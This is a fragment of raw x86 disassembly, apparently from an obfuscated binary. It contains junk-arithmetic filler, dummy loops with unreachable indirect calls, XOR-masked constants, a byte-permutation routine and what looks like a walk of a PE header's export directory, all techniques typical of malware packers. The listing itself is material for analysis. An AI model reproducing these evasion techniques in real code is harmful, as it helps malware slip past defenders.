  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x423892
  41b017:	push   0x423812
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c56
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237ed
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423804
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c76
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bcc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423962
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ab1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d6a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c56
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423982
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c56
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
